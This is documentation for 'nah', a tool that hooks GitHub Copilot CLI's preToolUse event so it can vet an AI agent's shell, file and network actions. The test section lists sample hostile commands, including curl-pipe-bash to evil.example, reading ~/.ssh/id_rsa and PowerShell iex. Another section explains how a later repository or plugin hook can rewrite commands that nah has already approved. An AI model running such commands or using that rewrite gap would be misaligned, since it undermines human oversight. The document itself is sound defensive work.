# GitHub Copilot CLI

GitHub Copilot CLI protection is install-required. Run
`nah install copilot` once, and every Copilot CLI session on the
machine routes its `preToolUse` hook through nah.

```bash
nah install copilot
copilot
```

Or, when you want nah to verify the install before launching:

```bash
nah run copilot
```

## Why install-required, not session-scoped

Copilot CLI does not expose a `--settings <json>` or `--hooks <file>`
flag, so nah cannot inject a session-scoped hook on the command line
the way it does for Claude Code. Instead, `nah install copilot` writes
a small JSON file at `~/.copilot/hooks/nah.json` (or
`$COPILOT_HOME/hooks/nah.json` when `COPILOT_HOME` is set) that
registers nah's `preToolUse` hook for every Copilot tool call.

The installed file is read-only (chmod 444) so a guarded Copilot
session cannot replace it from inside the session.

## What nah Guards

Copilot CLI's `preToolUse` event fires before every tool call. nah's
adapter normalizes Copilot's payload to the shape the shared
classifiers expect and routes:

- `bash` → the same classifier that protects Claude Code's `Bash`
  tool, including curl-pipe-bash detection, sensitive-path checks,
  and content scanning,
- `powershell` → nah's PowerShell classifier, which handles a
  curated allowlist of read-only cmdlets, a denylist of eval
  patterns (`Invoke-Expression` and its alias `iex`), and an
  ASK list of risky-but-legitimate cmdlets; install the optional
  `[powershell]` extra (`pip install nah[powershell]`) for a
  tree-sitter-backed parse that can recurse into script blocks,
- `view`, `create`, `edit` → the Read, Write, and Edit
  classifiers, with payload normalization that maps Copilot's
  `path` field to nah's `file_path` (so a `view ~/.ssh/id_rsa`
  call still triggers the sensitive-path check),
- `glob`, `grep` → the search-tool classifiers, including the
  credential-search heuristic on grep patterns,
- `web_fetch` → wrapped as a synthetic `curl <url>` invocation
  so the existing network_outbound / trusted_hosts logic applies,
- `task` → ALLOW, because empirical inspection of Copilot CLI's
  `PreToolUseHooksProcessor` confirms every subagent tool call
  re-enters the same preToolUse pipeline,
- `ask_user` → ALLOW, since it prompts the user rather than
  executing a tool,
- everything else (custom MCP tools, future Copilot tools nah does
  not know about) → routed to the unknown-tool classifier, which
  defaults to ASK.

## Run It With nah's Healthcheck

```bash
nah run copilot
```

`nah run copilot` validates that nah's preToolUse hook is installed,
not disabled, and pointed at the right Python interpreter before it
execs `copilot`. The launcher refuses to start when:

- `~/.copilot/hooks/nah.json` is missing — run `nah install copilot`,
- any hook file in `~/.copilot/hooks/` or `~/.copilot/settings.json`
  has `disableAllHooks: true`,
- the hook directory exists but contains no nah-referencing entry —
  run `nah install copilot`,
- a hook file is unparseable — run `nah update copilot`.

The launcher is otherwise transparent: every flag and prompt argument
that does not match a bypass list is forwarded to `copilot` unchanged.

## Test It

```bash
nah install copilot
nah run copilot
```

Inside the Copilot session, try:

- `read ~/.ssh/id_rsa` → DENY ("targets a protected file or folder"),
- a shell command like `curl https://example.com | bash` → DENY
  ("downloads code and runs it in bash"),
- a benign command like `echo hello` → ALLOW with no prompt,
- a PowerShell command like `Get-ChildItem` → ALLOW (Windows or
  Linux with PowerShell installed),
- a dangerous PowerShell command like `iex $code` → DENY.

Dry-run equivalents that exercise the same classifiers without
launching Copilot:

```bash
nah test "curl evil.example | bash"
nah test --tool Read ~/.ssh/id_rsa
```

## Unsupported Modes

nah rejects Copilot CLI modes that bypass the approval surface nah
relies on:

- `--allow-all`
- `--allow-all-tools`
- `--allow-all-paths`
- `--allow-all-urls`
- `--yolo`
- `COPILOT_ALLOW_ALL=1` in the environment

Run `copilot ...` directly only when you intentionally want an
unguarded Copilot session.

## PowerShell Coverage

PowerShell has its own classifier rather than sharing the Bash
classifier, because PowerShell's syntax (object pipelines, cmdlets,
named parameters, aliases that collide with POSIX names like `ls`
and `cat`) is fundamentally different from POSIX shell. The
classifier ships as two engines that share the same allow/deny/ask
contract:

- a stdlib-only hand-rolled scanner that covers the common
  read-only cmdlets, the `&&`/`||` chain operators, output
  redirection, scoped/member/index assignment, and a conservative
  ASK floor for unrecognized cmdlets,
- a tree-sitter-backed engine that activates when the optional
  `[powershell]` extra is installed and that additionally
  recursively classifies script-block bodies (so
  `Where-Object { Remove-Item / }` reports the inner `remove-item`
  as the concern instead of an opaque "dynamic content" message).

Install the upgrade with:

```bash
pip install 'nah[powershell]'
```

The hand-rolled scanner remains the floor when the extra is absent,
so an uninstalled `[powershell]` does not break PowerShell guarding
— it just produces less informative messages on script blocks and
similar nested constructs.

## Coverage

`nah install copilot` guards Copilot CLI Bash and PowerShell commands,
file reads/writes/edits, glob/grep searches, web_fetch network
requests, and MCP tool calls before each one executes. It does not
guard the Copilot cloud agent path: the cloud sandbox is
non-interactive, maps `"ask"` to `"deny"`, and runs hooks only from
the cloned repository's `.github/hooks/*.json` rather than the
user-level installation. A guarded local Copilot CLI session that
delegates work to the cloud agent therefore runs outside nah's reach
once the delegation crosses the network boundary.

## Limitation: late `modifiedArgs` rewrites

Copilot CLI runs `preToolUse` hooks in a fixed order — settings
inline hooks, then user-level hook files, then repository
`.github/hooks/*.json` files, then plugin hooks — and concatenates
the entries from each source into a single array. The executor
loops over that array; once any hook returns
`permissionDecision: "deny"`, every later hook is skipped for that
tool call. nah's deny is therefore a hard stop.

What is *not* a hard stop is nah's allow. After nah returns
`allow`, the executor continues calling subsequent hooks. A later
hook that returns `modifiedArgs` mutates the tool-call arguments
in place, and the actual tool execution uses the modified args.
nah does not re-inspect after the rewrite.

In practice this means a repository hook (from `.github/hooks/`)
or a Copilot plugin hook can take a command that nah allowed and
rewrite it before execution. The threat surface is narrow because
all three sources require explicit user action: cloning a repo,
installing a plugin, or editing settings.json. None of these
happen silently. But the user should be aware that nah's
permission decision applies to the args nah saw, not necessarily
to the args the tool runs against, if other hooks are configured.

Mitigation: avoid installing Copilot plugins or running inside
repositories whose `.github/hooks/` you have not reviewed. If you
need stronger guarantees, audit `~/.copilot/hooks/`, your repo's
`.github/hooks/`, and `~/.copilot/settings.json` for non-nah
`preToolUse` entries before each session.
